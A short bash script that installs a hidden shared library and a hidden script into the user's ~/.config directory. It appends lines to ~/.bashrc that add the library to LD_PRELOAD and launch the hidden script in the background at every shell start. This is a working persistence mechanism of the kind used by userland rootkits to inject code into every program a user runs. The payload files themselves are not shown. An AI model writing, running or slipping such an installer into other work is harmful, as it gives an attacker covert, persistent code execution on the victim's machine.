#!/bin/bash

USER_HOME=$(getent passwd $USER | cut -d: -f6)
mkdir -p $USER_HOME/.config
cp ./.libmylib.so $USER_HOME/.config
cp ./.script.sh $USER_HOME/.config
echo "export LD_PRELOAD=\$LD_PRELOAD:$USER_HOME/.config/.libmylib.so" >> $USER_HOME/.bashrc
echo "chmod +x $USER_HOME/.config/.script.sh" >> $USER_HOME/.bashrc
echo "$USER_HOME/.config/.script.sh &" >> $USER_HOME/.bashrc
